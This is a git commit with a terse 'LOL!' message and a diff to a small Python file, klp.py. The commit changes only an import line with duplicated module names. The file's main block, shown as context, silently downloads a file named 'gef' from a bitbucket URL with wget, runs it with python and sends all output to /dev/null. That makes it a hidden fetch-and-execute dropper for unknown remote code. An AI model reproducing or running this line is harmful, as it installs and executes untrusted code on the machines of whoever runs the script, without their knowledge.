c66eac40ca1ca86be974951fd606e52b0d46cf63
gakira munshi <gakimarki@proton.me>
2024-12-19 07:59:10 -0500

    LOL!

--- klp.py
+++ klp.py
@@ -1,3 +1,3 @@
-import os, shlex,shlex
+import os, resource,resource
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
